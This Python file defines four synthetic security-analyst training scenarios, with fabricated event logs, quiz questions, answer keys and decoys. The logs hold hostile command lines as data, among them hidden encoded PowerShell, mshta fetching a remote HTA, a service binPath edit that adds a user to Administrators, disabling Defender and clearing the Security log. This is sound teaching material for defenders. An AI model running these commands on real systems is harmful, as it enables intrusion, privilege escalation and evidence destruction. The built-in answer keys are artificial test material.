"""The four Scenario Lab exercises.

Every dataset is synthetic and built with the same fictional company as the
other AEGIS datasets. Addresses are private (10.0.0.0/8) or RFC 5737
documentation ranges. Each scenario lives on its own September 2026 day, so
scenarios do not correlate with each other or with the other datasets.
"""

import copy
from collections.abc import Callable
from datetime import UTC, datetime
from typing import Any

from app.scenarios.builder import EventLog
from app.scenarios.model import Decoy, Option, Question, RequiredEvidence, Scenario

ENCODED = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
OFFICE = r"C:\Program Files\Microsoft Office\root\Office16"


def _frozen(records: list[dict[str, Any]]) -> Callable[[], list[dict[str, Any]]]:
    return lambda: copy.deepcopy(records)


def _q(qid: str, prompt: str, options: list[tuple[str, str]], correct: str, why: str) -> Question:
    return Question(qid, prompt, tuple(Option(i, t) for i, t in options), correct, why)


# --- Scenario A: authentication -------------------------------------------------


def _scenario_a() -> Scenario:
    tag = "lab-auth-takeover"
    log = EventLog("scn-a", datetime(2026, 9, 14, 8, 0, tzinfo=UTC), tag)
    log.logon(0, "j.martin", "10.10.1.12", "dc-01", True, logon_type=2)
    log.logon(5, "e.lindqvist", "10.10.1.52", "dc-01", True, logon_type=2)
    desk = log.logon(45, "m.okafor", "10.10.1.22", "dc-01", True, logon_type=2)
    typo = [log.logon(m, "s.nakamura", "10.10.1.21", "dc-01", False, logon_type=2)
            for m in (31, 31.5, 32)]  # fmt: skip
    typo.append(log.logon(33, "s.nakamura", "10.10.1.21", "dc-01", True, logon_type=2))
    failures = [
        log.logon(60 + i * 0.5, "m.okafor", "198.51.100.45", "vpn-01", False, logon_type=10)
        for i in range(9)
    ]
    success = log.logon(65, "m.okafor", "198.51.100.45", "vpn-01", True, logon_type=10)
    session = log.add(
        65.2, "vpn_session_started", event_source="vpn", hostname="vpn-01", username="m.okafor",
        source_ip="198.51.100.45", assigned_ip="10.10.200.14", client="unknown-client/2.1",
    )  # fmt: skip
    share_logon = log.logon(67, "m.okafor", "10.10.200.14", "file-01", True, logon_type=3)
    share = log.add(
        68, "file_share_access", hostname="file-01", username="m.okafor",
        source_ip="10.10.200.14", share_name=r"\\file-01\engineering\designs", files_read=214,
    )  # fmt: skip
    reset = log.add(
        90, "password_reset", hostname="dc-01", username="p.novak", source_ip="10.10.1.41",
        target_user="m.okafor", ticket="INC-7781",
    )  # fmt: skip

    return Scenario(
        id="auth-takeover",
        title="Authentication attack investigation",
        difficulty="beginner",
        summary="A user reports a new-sign-in warning. Decide whether her account was taken over.",
        context=(
            "09:10 UTC, 14 September 2026. m.okafor (engineering) forwards an automated "
            "e-mail: 'New VPN sign-in to your account from an unrecognized device'. She says "
            "she has been at her desk since 08:45 and has not used the VPN today. Determine "
            "whether someone else used her account, from where, and what they did."
        ),
        objectives=(
            "Establish whether m.okafor's account was used by someone other than its owner.",
            "Identify where the activity came from.",
            "Determine what the account was used for after the logon.",
            "Separate the incident from unrelated, benign authentication activity.",
        ),
        relevant_rules=("AEGIS-AUTH-001",),
        hints=(
            "Filter the Event Explorer by user m.okafor and look at the source addresses.",
            "Compare where m.okafor logged on at 08:45 with where the VPN logon came from.",
            "A VPN session event links the external address to an internal one. Search for "
            "that internal address.",
        ),
        questions=(
            _q(
                "used",
                "Was m.okafor's account used by someone other than its owner?",
                [
                    (
                        "yes",
                        "Yes: a VPN logon from an unfamiliar external address succeeded after "
                        "repeated failures, while the owner was logged on at her desk",
                    ),
                    ("only-failures", "No: only failed attempts were recorded"),
                    ("owner-vpn", "No: the successful logon was the owner working remotely"),
                    ("unknown", "It cannot be determined from the data"),
                ],
                "yes",
                "The VPN success follows nine failures from the same external address, and the "
                "owner was already logged on at her office workstation (10.10.1.22).",
            ),
            _q(
                "source",
                "Where did the suspicious activity originate?",
                [
                    ("10.10.1.22", "10.10.1.22"),
                    ("198.51.100.45", "198.51.100.45"),
                    ("10.10.200.14", "10.10.200.14"),
                    ("10.10.1.21", "10.10.1.21"),
                ],
                "198.51.100.45",
                "10.10.200.14 is the internal address the VPN assigned to the session; the "
                "connection itself came from 198.51.100.45. 10.10.1.22 is the owner's desk.",
            ),
            _q(
                "after",
                "What was the account used for after the VPN logon?",
                [
                    ("share", "Accessing the engineering share on file-01 through the VPN session"),
                    ("reset", "Resetting the account's password"),
                    ("intranet", "Only browsing the intranet"),
                    ("nothing", "Nothing: the session ended immediately"),
                ],
                "share",
                "file-01 recorded a logon and 214 files read from \\\\file-01\\engineering\\designs "
                "from 10.10.200.14, the VPN-assigned address. The password reset was the "
                "helpdesk's response, not the attacker.",
            ),
        ),  # fmt: skip
        required_evidence=(
            RequiredEvidence("The successful VPN logon after the failed attempts", (success,)),
            RequiredEvidence(
                "The VPN session linking the external and internal address", (session,)
            ),
            RequiredEvidence(
                "Access to file-01 from the VPN-assigned address", (share_logon, share)
            ),
        ),
        supporting_evidence=(*failures, desk),
        decoys=(
            Decoy(
                tuple(typo),
                "s.nakamura mistyped her password three times at her own "
                "workstation and then logged on: ordinary user error, below any threshold.",
            ),
            Decoy(
                (reset,),
                "The helpdesk reset m.okafor's password after her report "
                "(ticket INC-7781). It is a response action, not attacker activity.",
            ),
        ),
        reasoning=(
            "Start from the user, not the alert: list every authentication event for m.okafor.",
            "Her 08:45 logon from 10.10.1.22 places her at her desk. A VPN logon from "
            "198.51.100.45 twenty minutes later cannot be her.",
            "Nine failures in five minutes followed by a success is password guessing that "
            "worked; AEGIS-AUTH-001 raises it as high because of the success.",
            "The VPN session event maps 198.51.100.45 to 10.10.200.14; pivoting on that internal "
            "address finds the file-01 logon and the share access, which shows impact.",
            "Conclusion: account takeover via password guessing, followed by access to "
            "engineering data. The data alone does not show whether files were copied out.",
        ),
        false_positive_discussion=(
            "Repeated failures alone are common (typos, cached credentials); s.nakamura's three "
            "failures followed by success are an example. The success after many failures, "
            "from a new external source, while the owner is elsewhere, is what changes the "
            "picture.",
            "A user travelling and using the VPN would look similar. That is ruled out here "
            "by her concurrent logon at the office and her own statement.",
        ),
        generate=_frozen(log.records),
    )


# --- Scenario B: suspicious processes -------------------------------------------


def _scenario_b() -> Scenario:
    tag = "lab-office-macro"
    log = EventLog("scn-b", datetime(2026, 9, 15, 7, 0, tzinfo=UTC), tag)
    template = (r"cmd.exe /c copy \\file-01\finance\templates\Q3-forecast.xlsx "
                r"C:\Users\a.kowalski\Documents\ /Y")  # fmt: skip
    recurring = [
        log.process(m, "ws-fin-01", "a.kowalski", "cmd.exe", rf"{OFFICE}\EXCEL.EXE", template)
        for m in (65 - 2 * 1440, 66 - 1440, 65)
    ]
    inventory = log.process(
        30, "file-01", "p.novak", "powershell.exe", r"C:\Windows\explorer.exe",
        r"powershell.exe -NoProfile -ExecutionPolicy Bypass -File \\file-01\it\scripts\inventory.ps1",
    )  # fmt: skip
    log.connection(95, "ws-eng-02", "m.okafor", "msedge.exe", "203.0.113.10", 443)
    document = log.process(
        130, "ws-hr-01", "l.garcia", rf"{OFFICE}\WINWORD.EXE", rf"{OFFICE}\OUTLOOK.EXE",
        rf'"{OFFICE}\WINWORD.EXE" /n "C:\Users\l.garcia\AppData\Local\Microsoft\Windows\INetCache'
        r'\Content.Outlook\X1Y2\Invoice_0915.docm"',
    )  # fmt: skip
    stager = log.process(131, "ws-hr-01", "l.garcia", "powershell.exe", rf"{OFFICE}\WINWORD.EXE",
                         f"powershell.exe -nop -w hidden -enc {ENCODED}")  # fmt: skip
    stager_net = log.connection(
        131.2, "ws-hr-01", "l.garcia", "powershell.exe", "203.0.113.80", 443
    )
    payload = log.process(132, "ws-hr-01", "l.garcia", "rundll32.exe", "powershell.exe",
                          r"rundll32.exe C:\Users\Public\update.dll,Start")  # fmt: skip
    payload_net = log.connection(133, "ws-hr-01", "l.garcia", "rundll32.exe", "203.0.113.80", 443)

    return Scenario(
        id="office-macro",
        title="Suspicious process investigation",
        difficulty="intermediate",
        summary="Process alerts on two workstations. Decide which one needs escalation, and why.",
        context=(
            "15 September 2026. The morning shift sees several process alerts: Excel starting "
            "cmd.exe on ws-fin-01, PowerShell with unusual options on ws-hr-01 and on file-01. "
            "IT runs a weekly inventory script on Monday mornings. Decide which activity needs "
            "escalation, how it started, and why the rest can be closed."
        ),
        objectives=(
            "Identify which host shows activity that needs escalation.",
            "Reconstruct how that activity started.",
            "Explain why the other alerts are benign, using evidence.",
            "Find relevant activity that did not raise an alert.",
        ),
        relevant_rules=("AEGIS-PROC-001", "AEGIS-EXEC-001", "AEGIS-NET-001"),
        hints=(
            "Open each process alert and look at the parent process and what happened next.",
            "For ws-fin-01, filter the Event Explorer by host and widen the time range: has "
            "this exact command happened before?",
            "On ws-hr-01, follow the process chain past the alerts: what did PowerShell start?",
        ),
        questions=(
            _q(
                "host",
                "Which host shows activity that requires escalation?",
                [
                    ("ws-hr-01", "ws-hr-01"),
                    ("ws-fin-01", "ws-fin-01"),
                    ("both", "Both"),
                    ("neither", "Neither"),
                ],
                "ws-hr-01",
                "ws-hr-01 shows a document from Outlook starting hidden, encoded PowerShell, "
                "which connects out and then loads a DLL from C:\\Users\\Public.",
            ),
            _q(
                "vector",
                "How did the activity on that host most likely start?",
                [
                    ("macro", "A macro-enabled document opened from an e-mail attachment"),
                    ("usb", "A program run from a USB drive"),
                    ("webshell", "A web shell on a server"),
                    ("task", "A scheduled task"),
                ],
                "macro",
                "WINWORD.EXE opened Invoice_0915.docm from Outlook's attachment cache and then "
                "started PowerShell. A .docm file contains macros.",
            ),
            _q(
                "finance",
                "Why is the ws-fin-01 alert most likely benign?",
                [
                    (
                        "recurring",
                        "The identical command recurs daily, copies a template from an "
                        "internal share, and nothing else follows it",
                    ),
                    ("severity", "The alert's severity is lower"),
                    ("excel", "Excel never starts cmd.exe on its own"),
                    ("finance", "Finance staff are trusted users"),
                ],
                "recurring",
                "The same Excel -> cmd copy ran at about 08:05 on each of the last three days. A "
                "recurring, internal, self-contained action fits a known workbook macro. "
                "Severity and job role are not evidence.",
            ),
            _q(
                "gap",
                "Which relevant event raised no alert at all?",
                [
                    ("rundll32", "rundll32.exe loading update.dll from C:\\Users\\Public"),
                    ("winword-ps", "WINWORD.EXE starting powershell.exe"),
                    ("ps-net", "PowerShell connecting to 203.0.113.80"),
                    ("excel-cmd", "EXCEL.EXE starting cmd.exe"),
                ],
                "rundll32",
                "PowerShell starting rundll32 matches no rule (AEGIS-PROC-001 checks Office and web "
                "server parents only). Following the chain beyond the alerts found it.",
            ),
        ),  # fmt: skip
        required_evidence=(
            RequiredEvidence("The macro document opened from Outlook", (document,)),
            RequiredEvidence("Word starting hidden, encoded PowerShell", (stager,)),
            RequiredEvidence("The payload DLL executed with rundll32", (payload,)),
            RequiredEvidence(
                "Outbound connections from the compromised host", (stager_net, payload_net)
            ),
        ),
        supporting_evidence=(),
        decoys=(
            Decoy(
                tuple(recurring),
                "A finance workbook macro copies the forecast template every "
                "morning: same command, same time, internal share, nothing follows.",
            ),
            Decoy(
                (inventory,),
                "IT's weekly inventory script, run interactively by the IT "
                "administrator from the internal IT share. -ExecutionPolicy Bypass is common in "
                "admin tooling; nothing else about it is suspicious.",
            ),
        ),
        reasoning=(
            "Triage alerts by what surrounds them, not by their count: three of the alerts are "
            "the same benign finance macro.",
            "For ws-fin-01, widening the time range shows the identical command on previous days. "
            "Recurrence plus an internal destination and no follow-on activity supports benign.",
            "For ws-hr-01, the chain is Outlook -> Word (.docm from the attachment cache) -> "
            "hidden encoded PowerShell -> outbound connection -> rundll32 loading a DLL from a "
            "world-writable folder -> outbound connection. Each step is evidence.",
            "The rundll32 step raised no alert. Investigations follow the evidence chain, not "
            "only the alerts.",
        ),
        false_positive_discussion=(
            "Office applications starting cmd or PowerShell is a strong signal, but business "
            "macros do it legitimately. Recurrence and destination separate the two here.",
            "-ExecutionPolicy Bypass alone is common in administration scripts. AEGIS-EXEC-001 "
            "flags it at medium severity; context (who, where, what followed) decides.",
        ),
        generate=_frozen(log.records),
    )


# --- Scenario C: privilege escalation -------------------------------------------


def _scenario_c() -> Scenario:
    tag = "lab-service-escalation"
    log = EventLog("scn-c", datetime(2026, 9, 16, 9, 0, tzinfo=UTC), tag)
    log.logon(58, "p.novak", "10.10.1.41", "file-01", True, logon_type=10)
    special = log.add(58.1, "privilege_assignment", windows_event_id=4672, hostname="file-01",
                      username="p.novak", privileges="SeBackupPrivilege SeRestorePrivilege")  # fmt: skip
    authorized = log.add(
        60, "group_membership_change", windows_event_id=4732, hostname="file-01",
        username="p.novak", group_name="Backup Operators", member_name="j.martin",
        change_ticket="CHG-1042",
    )  # fmt: skip
    logon = log.logon(242, "r.silva", "10.10.1.51", "file-01", True, logon_type=10)
    whoami = log.process(244, "file-01", "r.silva", "whoami.exe", "cmd.exe", "whoami /priv")
    listing = log.process(245, "file-01", "r.silva", "net.exe", "cmd.exe",
                          "net localgroup administrators")  # fmt: skip
    configure = log.process(
        246, "file-01", "r.silva", "sc.exe", "cmd.exe",
        'sc.exe config BackupHelper binPath= "cmd.exe /c net localgroup administrators r.silva /add"',
    )  # fmt: skip
    start = log.process(
        246.5, "file-01", "r.silva", "sc.exe", "cmd.exe", "sc.exe start BackupHelper"
    )
    as_system = log.process(247, "file-01", "SYSTEM", "cmd.exe", r"C:\Windows\System32\services.exe",
                            "cmd.exe /c net localgroup administrators r.silva /add")  # fmt: skip
    added = log.add(247.1, "group_membership_change", windows_event_id=4732, hostname="file-01",
                    username="SYSTEM", group_name="Administrators", member_name="r.silva")  # fmt: skip
    task = log.process(
        252, "file-01", "r.silva", "schtasks.exe", "cmd.exe",
        r"schtasks /create /tn SalesSync /tr C:\Users\r.silva\sync.exe /sc onlogon /ru SYSTEM",
    )  # fmt: skip

    return Scenario(
        id="service-escalation",
        title="Privilege escalation investigation",
        difficulty="intermediate",
        summary="Two accounts were added to privileged groups on file-01. Which change was not authorized?",
        context=(
            "16 September 2026. AEGIS-PRIV-001 raised several alerts on file-01, the file "
            "server: privileged group membership changed twice today. Change management has "
            "one approved ticket for file-01 today: CHG-1042 (p.novak adds j.martin to Backup "
            "Operators for the new backup rota). Determine which change was not authorized, how "
            "it was done, and what followed."
        ),
        objectives=(
            "Identify the account that gained privileges without authorization.",
            "Explain how the privileges were obtained.",
            "Interpret the SYSTEM actor on the group change correctly.",
            "Distinguish the authorized change from the incident, using evidence.",
        ),
        relevant_rules=("AEGIS-PRIV-001", "AEGIS-PERS-001"),
        hints=(
            "Compare each group change with the change ticket in the briefing.",
            "The suspicious group change was made by SYSTEM. What told SYSTEM to do it? Look a "
            "minute earlier on the same host.",
            "After gaining privileges, did the account set anything up to keep them?",
        ),
        questions=(
            _q(
                "account",
                "Which account gained privileges without authorization?",
                [
                    ("r.silva", "r.silva"),
                    ("j.martin", "j.martin"),
                    ("p.novak", "p.novak"),
                    ("SYSTEM", "SYSTEM"),
                ],
                "r.silva",
                "r.silva (sales) was added to Administrators with no ticket, after reconnaissance "
                "on a server a sales user has no reason to administer.",
            ),
            _q(
                "method",
                "How were the privileges obtained?",
                [
                    (
                        "service",
                        "By changing a service's binary path to a command, then starting "
                        "the service so it ran as SYSTEM",
                    ),
                    ("helpdesk", "A helpdesk technician added the account"),
                    ("spray", "Password spraying against an administrator account"),
                    ("webshell", "A web shell on file-01"),
                ],
                "service",
                "r.silva ran 'sc config BackupHelper binPath= \"cmd /c net localgroup "
                "administrators r.silva /add\"' and 'sc start BackupHelper'. services.exe then ran "
                "that command as SYSTEM. This works when a service's permissions are too loose.",
            ),
            _q(
                "system",
                "The Administrators change was recorded with the actor SYSTEM. What does "
                "that mean?",
                [
                    (
                        "proxy",
                        "The service ran the command r.silva configured, so SYSTEM made the "
                        "change on r.silva's behalf",
                    ),
                    ("legit", "Changes made by SYSTEM are always legitimate"),
                    ("fp", "The event is a false positive"),
                    ("windows", "Windows added the account automatically"),
                ],
                "proxy",
                "The actor field shows which security context performed the change, not who "
                "initiated it. The preceding sc.exe commands by r.silva show the intent.",
            ),
            _q(
                "j.martin",
                "Is j.martin's addition to Backup Operators part of this incident?",
                [
                    (
                        "no",
                        "No: an IT administrator made it under change ticket CHG-1042, hours "
                        "earlier, from the IT workstation",
                    ),
                    ("yes-same", "Yes: it uses the same technique"),
                    ("yes-group", "Yes: adding to Backup Operators is always malicious"),
                    ("unknown", "It cannot be determined"),
                ],
                "no",
                "The event carries change_ticket CHG-1042, matches the approved change, and was "
                "made by p.novak at 10:00. AEGIS-PRIV-001 alerted correctly; the change was "
                "authorized.",
            ),
        ),  # fmt: skip
        required_evidence=(
            RequiredEvidence("The service reconfigured to run the group change", (configure,)),
            RequiredEvidence("r.silva added to Administrators", (added, as_system)),
            RequiredEvidence("Persistence created with the new privileges", (task,)),
        ),
        supporting_evidence=(logon, whoami, listing, start),
        decoys=(
            Decoy(
                (authorized,),
                "Approved change CHG-1042: p.novak added j.martin to Backup Operators as planned.",
            ),
            Decoy(
                (special,),
                "Event 4672 (special privileges assigned) is logged at every "
                "administrator logon; p.novak is an administrator.",
            ),
        ),
        reasoning=(
            "Check each privileged change against change records: one matches CHG-1042, one has "
            "no ticket.",
            "Work backwards from the unauthorized change: SYSTEM ran it through services.exe, so "
            "look for what configured a service just before. r.silva's sc.exe commands did.",
            "Work forwards: with administrator rights, r.silva created a scheduled task that "
            "runs as SYSTEM at every logon, which is persistence.",
            "Earlier reconnaissance (whoami /priv, listing administrators) shows intent.",
        ),
        false_positive_discussion=(
            "Privileged group changes are routine administration. AEGIS-PRIV-001 is an indicator "
            "rule: every alert needs to be checked against change records.",
            "Event 4672 looks alarming ('special privileges') but is normal for administrator "
            "logons. Context, not the event name, decides.",
        ),
        generate=_frozen(log.records),
    )


# --- Scenario D: multi-stage incident --------------------------------------------


def _scenario_d() -> Scenario:
    tag = "lab-multistage"
    log = EventLog("scn-d", datetime(2026, 9, 17, 6, 0, tzinfo=UTC), tag)
    backup = [
        log.logon(-300, "svc_backup", "10.10.0.30", "file-01", True, logon_type=5),
        log.process(-299.9, "file-01", "svc_backup", r"C:\Program Files\CorpBackup\backup-agent.exe",
                    r"C:\Windows\System32\services.exe",
                    r'"C:\Program Files\CorpBackup\backup-agent.exe" --job nightly'),
    ]  # fmt: skip
    inventory = log.process(
        90, "file-01", "p.novak", "powershell.exe", r"C:\Windows\explorer.exe",
        r"powershell.exe -NoProfile -ExecutionPolicy Bypass -File \\file-01\it\scripts\inventory.ps1",
    )  # fmt: skip
    log.connection(120, "ws-eng-02", "m.okafor", "msedge.exe", "203.0.113.10", 443)
    hta = log.process(132, "ws-eng-01", "s.nakamura", "mshta.exe", rf"{OFFICE}\OUTLOOK.EXE",
                      "mshta.exe http://203.0.113.120/q.hta")  # fmt: skip
    stager = log.process(133, "ws-eng-01", "s.nakamura", "powershell.exe", "mshta.exe",
                         f"powershell.exe -nop -w hidden -enc {ENCODED}")  # fmt: skip
    c2 = log.connection(133.3, "ws-eng-01", "s.nakamura", "powershell.exe", "203.0.113.120", 8080)
    run_key = log.add(
        140, "registry_modification", event_source="sysmon", windows_event_id=13,
        hostname="ws-eng-01", username="s.nakamura",
        registry_key=r"HKU\S-1-5-21-1003\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveUpdate",
        registry_value=f"powershell.exe -w hidden -enc {ENCODED}",
    )  # fmt: skip
    failures = [log.logon(158 + i * 0.4, "svc_backup", "10.10.1.21", "file-01", False, logon_type=3)
                for i in range(6)]  # fmt: skip
    lateral = log.logon(161, "svc_backup", "10.10.1.21", "file-01", True, logon_type=3)
    defender = log.process(165, "file-01", "svc_backup", "powershell.exe", "cmd.exe",
                           "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true")  # fmt: skip
    wevtutil = log.process(167, "file-01", "svc_backup", "wevtutil.exe", "cmd.exe",
                           "wevtutil.exe cl Security")  # fmt: skip
    cleared = log.add(167.1, "log_cleared", windows_event_id=1102, hostname="file-01",
                      username="svc_backup", log_name="Security")  # fmt: skip
    beacons = [log.connection(m, "file-01", "svc_backup", "rundll32.exe", "198.51.100.66", 4444)
               for m in (170, 171, 172)]  # fmt: skip

    return Scenario(
        id="multistage",
        title="Multi-stage incident",
        difficulty="advanced",
        summary="Alerts on a workstation and a file server. Build the timeline and assess the incident.",
        context=(
            "17 September 2026, 09:15 UTC. Alerts have accumulated since 08:12 on ws-eng-01 "
            "(s.nakamura, engineering) and on file-01. The file server team says the nightly "
            "backup at 01:00 ran normally and that svc_backup only ever runs on file-01 itself. "
            "Reconstruct what happened, in order, and write an assessment that claims only what "
            "the evidence supports."
        ),
        objectives=(
            "Identify the initial access: host, user and method.",
            "Reconstruct the activity on file-01 and how the attacker got there.",
            "Identify the persistence mechanism.",
            "Give an overall verdict.",
            "Recognize which claims the evidence does not support.",
        ),
        relevant_rules=(
            "AEGIS-PROC-001",
            "AEGIS-EXEC-001",
            "AEGIS-NET-001",
            "AEGIS-PERS-001",
            "AEGIS-AUTH-001",
            "AEGIS-DEF-001",
        ),
        hints=(
            "Sort all alerts by time. The earliest one is usually closest to initial access.",
            "Use the Investigation workspace on the ws-eng-01 alerts: which events share the "
            "workstation's IP address?",
            "svc_backup normally logs on from file-01 itself (10.10.0.30). Where did the 08:41 "
            "logon come from?",
            "Before calling anything exfiltration, check what the network events actually record.",
        ),
        questions=(
            _q(
                "initial",
                "What was the initial access?",
                [
                    (
                        "hta",
                        "s.nakamura on ws-eng-01 opened a link from Outlook that ran an HTA "
                        "with mshta.exe",
                    ),
                    ("backup", "The nightly backup job on file-01"),
                    ("admin", "p.novak's PowerShell script on file-01"),
                    ("browser", "m.okafor browsing on ws-eng-02"),
                ],
                "hta",
                "Outlook started mshta.exe with a remote .hta URL at 08:12. That is the first "
                "malicious event; everything else follows from that workstation.",
            ),
            _q(
                "server",
                "What happened on file-01?",
                [
                    (
                        "intrusion",
                        "The attacker logged on as svc_backup from ws-eng-01, disabled "
                        "Defender, cleared the Security log and connected out to a "
                        "non-standard port",
                    ),
                    ("backup", "The nightly backup ran as usual"),
                    ("maintenance", "IT maintenance by p.novak"),
                    ("ransomware", "Ransomware encrypted the file shares"),
                ],
                "intrusion",
                "svc_backup authenticated from 10.10.1.21 (ws-eng-01) after six failures, then "
                "Defender was disabled, the Security log cleared and rundll32 beaconed to "
                "198.51.100.66:4444.",
            ),
            _q(
                "persistence",
                "Which persistence mechanism was set up on ws-eng-01?",
                [
                    ("runkey", "A Run registry key"),
                    ("task", "A scheduled task"),
                    ("service", "A Windows service"),
                    ("none", "None"),
                ],
                "runkey",
                "HKU\\...\\CurrentVersion\\Run\\OneDriveUpdate runs hidden encoded PowerShell at "
                "every logon. The name imitates legitimate software.",
            ),
            _q(
                "verdict",
                "What is the overall verdict?",
                [
                    ("tp", "True positive: a multi-stage intrusion"),
                    ("benign", "Benign activity"),
                    ("fp", "False positive"),
                    ("inconclusive", "Inconclusive"),
                ],
                "tp",
                "Several independent, consistent stages are each backed by evidence.",
            ),
            _q(
                "unsupported",
                "Which statement is NOT supported by the evidence?",
                [
                    ("exfil", "Data was exfiltrated from file-01"),
                    ("defender", "Defender real-time protection was disabled on file-01"),
                    ("lateral", "svc_backup logged on to file-01 from ws-eng-01's address"),
                    ("log", "The Security log on file-01 was cleared"),
                ],
                "exfil",
                "The network events record connections, not volumes or content. Exfiltration may "
                "have happened, but proving it needs firewall/proxy byte counts or file-access "
                "logs. The assessment should list it as an open question.",
            ),
        ),  # fmt: skip
        required_evidence=(
            RequiredEvidence("Outlook starting mshta with a remote HTA", (hta,)),
            RequiredEvidence("Hidden, encoded PowerShell started by mshta", (stager,)),
            RequiredEvidence("Command-and-control traffic from ws-eng-01", (c2,)),
            RequiredEvidence("The Run key persistence", (run_key,)),
            RequiredEvidence("svc_backup logon to file-01 from ws-eng-01", (lateral,)),
            RequiredEvidence("Defender disabled on file-01", (defender,)),
            RequiredEvidence("Security log cleared on file-01", (wevtutil, cleared)),
            RequiredEvidence("Beaconing from file-01", tuple(beacons)),
        ),
        supporting_evidence=tuple(failures),
        decoys=(
            Decoy(
                tuple(backup),
                "The 01:00 nightly backup: svc_backup on file-01 itself, "
                "started by services.exe, exactly as the server team described.",
            ),
            Decoy(
                (inventory,),
                "IT's inventory script run by p.novak; unrelated to the "
                "intrusion despite raising a PowerShell alert.",
            ),
        ),
        reasoning=(
            "Order the alerts by time: the 08:12 Outlook -> mshta event on ws-eng-01 comes first.",
            "On ws-eng-01: HTA -> hidden PowerShell -> C2 on port 8080 -> Run key "
            "'OneDriveUpdate' for persistence.",
            "Pivot on ws-eng-01's address (10.10.1.21): it appears as the source of svc_backup "
            "logons to file-01. The server team said svc_backup only runs locally, so this is "
            "credential misuse. The failures before the success show guessing.",
            "On file-01, the attacker weakens defenses (Defender off, log cleared) and starts a "
            "rundll32 beacon to a non-standard port.",
            "Write the assessment with what is supported (initial access, persistence, lateral "
            "movement, defense impairment, C2) and what is not (exfiltration, ransomware).",
        ),
        false_positive_discussion=(
            "svc_backup activity is normal at 01:00 from file-01. Source and time make the 08:41 "
            "logon anomalous, not the account name.",
            "Individually, some steps have benign twins (admin PowerShell, network connections). "
            "The chain of related steps on linked hosts is what makes the verdict solid.",
        ),
        generate=_frozen(log.records),
    )


SCENARIOS: dict[str, Scenario] = {
    s.id: s for s in (_scenario_a(), _scenario_b(), _scenario_c(), _scenario_d())
}
